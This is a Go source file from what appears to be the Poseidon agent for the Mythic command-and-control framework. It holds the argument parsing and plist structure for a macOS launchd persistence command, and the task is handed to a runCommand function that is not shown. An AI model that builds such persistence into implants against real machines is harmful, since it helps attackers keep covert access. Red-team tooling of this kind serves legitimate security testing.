package persist_launchd

import (

	// Poseidon

	"encoding/json"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

type Arguments struct {
	Label       string
	ProgramArgs []string
	KeepAlive   bool
	RunAtLoad   bool
	Path        string
	LocalAgent  bool
	Remove      bool
}

func (e *Arguments) parseStringArray(configArray []interface{}) []string {
	urls := make([]string, len(configArray))
	if configArray != nil {
		for l, p := range configArray {
			urls[l] = p.(string)
		}
	}
	return urls
}
func (e *Arguments) UnmarshalJSON(data []byte) error {
	alias := map[string]interface{}{}
	err := json.Unmarshal(data, &alias)
	if err != nil {
		return err
	}
	if v, ok := alias["Label"]; ok {
		e.Label = v.(string)
	}
	if v, ok := alias["KeepAlive"]; ok {
		e.KeepAlive = v.(bool)
	}
	if v, ok := alias["RunAtLoad"]; ok {
		e.RunAtLoad = v.(bool)
	}
	if v, ok := alias["args"]; ok {
		e.ProgramArgs = e.parseStringArray(v.([]interface{}))
	}
	if v, ok := alias["LaunchPath"]; ok {
		e.Path = v.(string)
	}
	if v, ok := alias["LocalAgent"]; ok {
		e.LocalAgent = v.(bool)
	}
	if v, ok := alias["remove"]; ok {
		e.Remove = v.(bool)
	}
	return nil
}

type launchPlist struct {
	Label            string   `plist:"Label"`
	ProgramArguments []string `plist:"ProgramArguments"`
	RunAtLoad        bool     `plist:"RunAtLoad"`
	KeepAlive        bool     `plist:"KeepAlive"`
}

func Run(task structs.Task) {
	runCommand(task)
	return
}
